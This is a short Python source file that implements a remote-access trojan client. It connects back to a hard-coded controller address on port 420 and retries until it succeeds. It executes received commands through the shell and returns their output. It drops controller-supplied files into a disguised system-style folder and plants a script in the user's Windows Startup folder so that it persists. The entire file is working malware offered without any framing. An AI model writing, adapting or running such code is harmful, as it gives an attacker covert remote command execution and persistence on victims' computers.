import socket as s
from subprocess import check_output, call
from time import sleep
from sys import exit
from random import randint
from os import getlogin
import threading

HOST = "10.0.0.5"
PORT = 420
BUFFER = 1024
FORMAT = "cp850"
ADDR = (HOST, PORT)

global client


def connector():
    try:
        global client
        client = s.socket(s.AF_INET, s.SOCK_STREAM)
        client.connect(ADDR)
        recvMsg()
    except ConnectionRefusedError:
        print("retrying in 30 secs")
        sleep(30)
        connector()


def sendMsg(msg):
    sendLength = str(len(msg)).encode(FORMAT)
    client.send(sendLength)

    client.send(msg.encode(FORMAT))
    recvMsg()


def process(message):
    ctype = message[0]
    if ctype == "c":
        messageLst = message.split(" ")
        mode = messageLst[1]
        messageLst.pop(0)
        messageLst.pop(0)

        def comm():
            return check_output(messageLst, shell=True).decode(FORMAT)

        def tComm():
            call(messageLst, shell=True)

        if mode == "o":
            sendMsg(comm())
        else:
            threads = threading.Thread(target=tComm)
            threads.start()
            recvMsg()

    elif ctype == "f":
        msgNoType = message[1:]
        mode = msgNoType[4]
        msg = message[5:]
        name = f"{randint(100, 900)}.{msgNoType[0:3].replace(' ', '')}"

        with open(f"{name}", "w") as fileObj:
            fileObj.write(msg)

        if mode == "A":
            if call(["powershell" "Test-path" "-Path" "C:\\$SysStartup\\temp"], shell=True) == "True":
                call(["move", f"{name}", "C:/$SysStartup/temp"], shell=True)
                with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.pyw", "a") as obj:
                    obj.write(f'{name[0:3]} = lambda:call(["python", f"C:\\$SysStartup\\temp\\{name}"], shell=True)')
                    obj.write(f'threading.Thread.start()')

                sendMsg(name)
            else:
                call(["remove", name])
                sendMsg("err")
        else:
            call(["move", name, f"C:\\Users\\{getlogin()}\\AppData\\Local\\Temp"], shell=True)
            sendMsg(name)
    else:
        if message == "!dsc":
            client.close()
            sleep(30)
            connector()


def recvMsg():
    msgLen = client.recv(BUFFER).decode(FORMAT)

    if msgLen and not "":
        msgLen = int(msgLen)
        msg = client.recv(int(msgLen)).decode(FORMAT)
        process(msg)


connector()
